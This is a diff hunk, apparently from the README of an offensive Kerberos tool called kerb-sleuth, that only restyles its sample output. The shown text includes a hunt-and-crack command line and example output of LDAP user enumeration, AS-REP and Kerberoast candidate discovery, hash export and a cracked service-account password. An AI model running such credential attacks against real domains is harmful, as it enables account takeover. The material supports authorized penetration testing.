@@ -168,21 +168,21 @@ kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized
 ```
 🩸 KERB-SLEUTH v1.0.0 - Kerberos Vulnerability Hunter 
 
- Attempting to connect to target: 10.0.0.1
- Connected via Anonymous LDAP, Base DN: DC=corp,DC=local  
- Domain: CORP.LOCAL
- Enumerated 1,337 users from target
- Found 3 AS-REP candidates
- Found 12 Kerberoast candidates  
- Results written to: results.json
+ [*]Attempting to connect to target: 10.0.0.1
+ [+]Connected via Anonymous LDAP, Base DN: DC=corp,DC=local  
+ [+]Domain: CORP.LOCAL
+ [+]Enumerated 1,337 users from target
+ [+]Found 3 AS-REP candidates
+ [+]Found 12 Kerberoast candidates  
+ [+]Results written to: results.json
 
- Starting hash extraction and cracking...
- AS-REP hashes exported to: hashes/asrep_hashes.txt
- Starting AS-REP hash cracking with wordlist: /usr/share/wordlists/rockyou.txt  
- CRACKED PASSWORDS FOUND!
-backup_svc:Password123!
+ [*]Starting hash extraction and cracking...
+ [+]AS-REP hashes exported to: hashes/asrep_hashes.txt
+ [*]Starting AS-REP hash cracking with wordlist: /usr/share/wordlists/rockyou.txt  
+ [+]CRACKED PASSWORDS FOUND!
+ backup_svc:Password123!
 
- Hunt complete! High: 2 | Medium: 8 | Low: 5 risk targets
+ [+]Hunt complete! High: 2 | Medium: 8 | Low: 5 risk targets
  2 HIGH RISK targets found! Check results.json for details
 ```
 
